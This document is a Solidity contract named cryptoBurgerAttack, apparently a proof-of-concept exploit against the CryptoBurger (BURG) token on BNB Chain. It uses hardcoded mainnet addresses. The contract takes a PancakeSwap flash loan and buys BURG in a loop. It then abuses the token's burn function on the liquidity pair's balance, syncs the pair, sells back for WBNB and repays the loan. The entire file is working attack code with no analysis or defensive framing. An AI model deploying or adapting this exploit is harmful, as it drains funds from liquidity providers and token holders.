// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../interfaces/IERC20.sol";
import "../interfaces/sushiswap.sol";

interface IPancakeCallee {
    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IWBNB is IERC20 {
    function deposit() external payable;

    function withdraw(uint256) external;
}

contract cryptoBurgerAttack is IPancakeCallee {
    address private constant PANCAKE_SWAP_ROUTER =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private constant PANCAKE_SWAP_FACTORY =
        0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    address private constant PANCAKE_SWAP_PAIR =
        0x02b0551B656509754285eeC81eE894338E14C5DD;

    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address private constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

    address private constant BURGER =
        0xF40d33DE6737367A1cCB0cE6a056698D993A17E1;

    IERC20 WBNB_interface = IERC20(WBNB);
    IERC20 BURGER_interface = IERC20(BURGER);

    event LOG(string message, uint256 amount);
    event LOGAdd(string message, address amount);

    function flashLoan(address _tokenBorrow, uint256 _amount) public {
        address pair = IPancakeFactory(PANCAKE_SWAP_FACTORY).getPair(
            _tokenBorrow,
            USDC
        );

        // Check if pair exists
        require(pair != address(0), "Pair doesn't exists!");

        address token0 = IPancakePair(pair).token0();
        address token1 = IPancakePair(pair).token1();
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        IPancakePair(pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(_tokenBorrow, _amount)
        );
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        address token0 = IPancakePair(msg.sender).token0();
        address token1 = IPancakePair(msg.sender).token1();

        address pair = IPancakeFactory(PANCAKE_SWAP_FACTORY).getPair(
            token0,
            token1
        );

        require(msg.sender == pair, "Not a pair contract!");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            _data,
            (address, uint256)
        );

        // Insert swap logic
        uint256 max_BURG_amount = 19999 * 1e18;
        uint256 swapCount;

        address[] memory path;
        path = new address[](2);
        uint256[] memory howMuchIneed;

        path[0] = WBNB;
        path[1] = BURGER;

        for (uint256 i = 0; i < 50; i++) {
            howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(
                max_BURG_amount,
                path
            );

            if (WBNB_interface.balanceOf(address(this)) - howMuchIneed[0] > 0) {
                swapIt(
                    WBNB,
                    BURGER,
                    howMuchIneed[0],
                    0,
                    payable(address(this))
                );
                swapCount += 1;
            } else {
                break;
            }
        }

        emit LOG(
            "Contract WBNB balance is!!!",
            WBNB_interface.balanceOf(address(this))
        );

        // Burn logic
        for (uint256 i = 0; i < 141; i++) {
            BURGER_interface.burn(PANCAKE_SWAP_PAIR, 19999 * 1e18);
        }
        IPancakePair(PANCAKE_SWAP_PAIR).sync();

        // Swap contract BURG'S to WBNB

        for (uint256 i = 0; i < 50; i++) {
            if (BURGER_interface.balanceOf(address(this)) > 20000 * 1e18) {
                swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));
            } else {
                break;
            }
        }

        // Compute Repay Amount
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        IERC20(tokenBorrow).transfer(pair, amountToRepay);
        emit LOG("repay amount", amountToRepay);
        emit LOG(
            "WBNB balance after repay",
            WBNB_interface.balanceOf(address(this))
        );
        emit LOG(
            "BURG balance of contract is ",
            BURGER_interface.balanceOf(address(this))
        );
    }

    function swapIt(
        address _tokenIn,
        address _tokenOut,
        uint256 amountIn, //
        uint256 amountOut, // The amount of $BURG token to receive
        address _to
    ) internal {
        IERC20(_tokenIn).approve(PANCAKE_SWAP_PAIR, amountIn);
        IERC20(_tokenIn).approve(PANCAKE_SWAP_ROUTER, amountIn);

        address[] memory path;
        path = new address[](2);

        path[0] = _tokenIn;
        path[1] = _tokenOut;

        IPancakeRouter01(PANCAKE_SWAP_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountIn,
                amountOut,
                path,
                address(this),
                block.timestamp
            );
    }

    receive() external payable {}
}
